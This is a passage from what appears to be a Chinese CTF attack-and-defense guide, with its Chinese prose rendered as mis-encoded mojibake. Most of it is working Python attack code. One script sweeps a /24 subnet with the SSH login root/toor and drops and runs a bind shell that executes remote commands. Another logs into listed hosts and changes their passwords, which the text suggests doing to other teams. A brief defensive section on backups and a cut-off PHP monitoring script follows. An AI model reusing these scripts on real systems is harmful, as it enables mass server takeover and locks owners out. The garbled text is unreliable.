<span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"æ— ç»“æœ!\"</span><span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \na <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¦‚æœå¯ä»¥ç™»å½•è€Œä¸”æœ‰ python ç¯å¢ƒå¯ä»¥å°è¯•ä½¿ç”¨ä¸‹é¢è¿™ä¸ª python æ‰¹é‡ ssh ç™»å½•å¹¶åå¼¹ python shell</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> queue\n<span class=\"token keyword\">import</span> time\n<span class=\"token comment\">#åå¼¹ shell python</span>\n\nq<span class=\"token operator\">=</span>queue<span class=\"token punctuation\">.</span>Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#lock = threading.Lock()</span>\n\n<span class=\"token comment\"># ssh ç”¨æˆ·å å¯†ç  ç™»é™†</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    shell <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n    #æœåŠ¡å™¨ç«¯\n    import socket\n    import os\n    s=socket.socket()   #åˆ›å»ºå¥—æ¥å­— #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n    s.bind(('0.0.0.0',1234))    #ç»‘å®šåœ°å€å’Œç«¯å£#0.0.0.0æ¥æ”¶ä»»æ„å®¢æˆ·ç«¯ipè¿æ¥\n    s.listen(5)                 #è°ƒç”¨listenæ–¹æ³•å¼€å§‹ç›‘å¬ç«¯å£ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºç­‰å¾…è¿æ¥çš„æœ€å¤§æ•°é‡\n    con,addr=s.accept()     #æ¥å—ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¿æ¥\n    #print(con,addr)\n\n    for i in range(10):\n        cmd=con.recv(1024)\n        print(cmd)\n        command=cmd.decode()\n        if command.startswith('cd'):\n            os.chdir(command[2:].strip())   #åˆ‡æ¢è·¯å¾„\n            result=os.getcwd()      #æ˜¾ç¤ºè·¯å¾„\n        else:\n            result=os.popen(command).read()\n        if result:\n            con.send(result.encode())\n        else:\n            con.send(b'OK!')\n    '''</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string\">'echo \\\"%s\\\" > ./shell.py'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'&amp;&amp; python3 ./shell.py'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\n    username <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\n    passwd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n    \n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>block<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n    ip_demo<span class=\"token operator\">=</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#åˆ¤æ–­æ˜¯å¦æˆåŠŸ</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#lock.acquire()</span>\n        res <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ + ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is success!!! [ + ]\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#lock.release()</span>\n            ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ - ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is Failed\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> x <span class=\"token operator\">></span> <span class=\"token number\">255</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finshed!!!!!!!!\"</span><span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>task_done<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\">#çº¿ç¨‹é˜Ÿåˆ—éƒ¨åˆ†</span>\nth<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nth_num<span class=\"token operator\">=</span><span class=\"token number\">255</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        t<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>main<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        th<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n\n<span class=\"token comment\">#q.join () æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æˆ‘ä»¬æ”¹å¯†ç æ˜¯ä¸ºäº†é˜²æ­¢è¢«åˆ«äººå¼±å£ä»¤çˆ†ç ´ï¼Œæˆ–è€…å¯†ç æ˜¯é»˜è®¤çš„æƒ…å†µå¯¼è‡´æœåŠ¡å™¨ä¸¢å¤±ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å»æ›´æ”¹åˆ«äººçš„å¯†ç </p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> sys\n\nssh_clients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ntimeout <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nnew_password <span class=\"token operator\">=</span> <span class=\"token string\">\"xcxy@ncwss123\"</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SSH_Client</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>is_root <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n        self<span class=\"token punctuation\">.</span>host <span class=\"token operator\">=</span> host\n        self<span class=\"token punctuation\">.</span>port <span class=\"token operator\">=</span> port\n        self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n        self<span class=\"token punctuation\">.</span>ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span>timeout<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">exec_command</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">change_password</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span><span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">!=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">:</span>\n            stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"success\"</span> <span class=\"token keyword\">in</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> new_password\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">save_log</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a+\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s %s %s %s\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t python %s [FILENAME]\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Loading file : %s\"</span> <span class=\"token operator\">%</span> filename<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n            line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n            host <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            username <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n            password <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Trying login : %s\"</span> <span class=\"token operator\">%</span> host<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                ssh_client <span class=\"token operator\">=</span> SSH_Client<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [-] %s\"</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span>\n            ssh_clients<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ssh_client<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Login finished. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+&#125; Got [%d] clients. \"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Starting changing password. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> ssh_client <span class=\"token keyword\">in</span> ssh_clients<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ssh_client<span class=\"token punctuation\">.</span>change_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Success!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n            ssh_client<span class=\"token punctuation\">.</span>save_log<span class=\"token punctuation\">(</span><span class=\"token string\">\"success.log\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Failed!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] something like interesting!!! \"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"ä¸‹è½½æºç å¤‡ä»½\"><a class=\"anchor\" href=\"#ä¸‹è½½æºç å¤‡ä»½\">#</a> ä¸‹è½½æºç ï¼Œå¤‡ä»½</h2>\n<p>ä½¿ç”¨ ssh å·¥å…·ä¿ç•™æºç ï¼Œå¤åˆ¶ä¸¤ä»½ï¼Œç”¨ d ç›¾å»æ‰«ä¸€ä»½<br />\nä»¥å…ç½‘ç«™å´©æºƒçš„æ—¶å€™æ— æ³•åŠæ—¶æ¢å¤ï¼Œå¯¼è‡´ check ä¸¢åˆ†</p>\n<h2 id=\"é˜²å¾¡\"><a class=\"anchor\" href=\"#é˜²å¾¡\">#</a> é˜²å¾¡</h2>\n<p>ä¸Šé¢æåˆ°æˆ‘ä»¬å°†æºç  down ä¸‹æ¥ååˆ©ç”¨ d ç›¾ç­‰å·¥å…·æ‰«æï¼Œå°†çˆ†å‡ºæ¥çš„ shell æ³¨é‡Šä¿®æ”¹æˆ–è€…åˆ é™¤ç­‰ï¼ˆå…·ä½“æ€ä¹ˆæ”¹æ ¹æ®æ¯”èµ›è¦æ±‚ï¼‰</p>\n<p>æ¥ç€å°±æ˜¯ç›‘æ§è„šæœ¬</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILEDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/tmp/loooooooogs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// æ—¥å¿—æ–‡ä»¶ç›®å½•</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// å¦‚æœç›®å½•ä¸å­˜åœ¨åˆ™åˆ›å»º</span>\n\t<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åˆ›å»ºç›®å½•</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// è·å–æ‰€æœ‰çš„å¤´ä¿¡æ¯</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 